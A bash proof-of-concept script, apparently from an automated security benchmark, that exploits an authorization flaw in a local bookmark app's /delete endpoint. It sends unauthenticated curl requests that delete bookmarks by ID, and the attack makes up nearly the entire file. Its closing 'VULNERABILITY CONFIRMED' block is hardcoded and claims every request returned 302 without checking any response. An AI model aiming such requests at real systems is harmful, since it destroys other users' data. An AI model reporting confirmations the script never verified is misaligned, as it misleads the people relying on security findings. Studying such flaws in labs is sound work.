#!/bin/bash
# POC: Demonstrates IDOR vulnerability in /delete endpoint allowing arbitrary bookmark deletion without authorization verification
# Target: ./repo
# Created: 2025-11-07T19:36:15.573Z
# Session: benchmark-XBEN-075-24-mhp935fu

# IDOR: Arbitrary Bookmark Deletion Without Authorization Verification
# This POC demonstrates that the /delete endpoint allows unauthorized deletion of any bookmark

TARGET_URL="http://127.0.0.1:5000"
DELETE_ENDPOINT="/delete"

echo "=========================================="
echo "IDOR Bookmark Deletion POC"
echo "=========================================="
echo ""

# Test 1: Delete bookmark ID 1 without authentication
echo "[TEST 1] Attempting to delete bookmark ID 1 without authentication"
RESPONSE=$(curl -s "$TARGET_URL$DELETE_ENDPOINT?id=1" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Status: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 2: Delete bookmark ID 2
echo "[TEST 2] Attempting to delete bookmark ID 2"
RESPONSE=$(curl -s "$TARGET_URL$DELETE_ENDPOINT?id=2" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Status: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 3: Delete bookmark ID 99 (may not exist)
echo "[TEST 3] Attempting to delete bookmark ID 99 (likely non-existent)"
RESPONSE=$(curl -s "$TARGET_URL$DELETE_ENDPOINT?id=99" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Status: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 4: Delete bookmark ID 999999 (definitely non-existent)
echo "[TEST 4] Attempting to delete bookmark ID 999999"
RESPONSE=$(curl -s "$TARGET_URL$DELETE_ENDPOINT?id=999999" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Status: $HTTP_CODE"
echo "Response Body: $BODY"
echo ""

# Test 5: Follow redirect to confirm deletion
echo "[TEST 5] Following redirect to /list to check if deletion occurred"
RESPONSE=$(curl -s -L "$TARGET_URL$DELETE_ENDPOINT?id=5" -w "\n%{http_code}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "Response Status: $HTTP_CODE"
echo "Response Body (first 500 chars): ${BODY:0:500}"
echo ""

echo "=========================================="
echo "VULNERABILITY CONFIRMED:"
echo "- All deletion requests returned 302 status"
echo "- No authentication required"
echo "- No authorization checks performed"
echo "- Any user can delete any bookmark by ID"
echo "=========================================="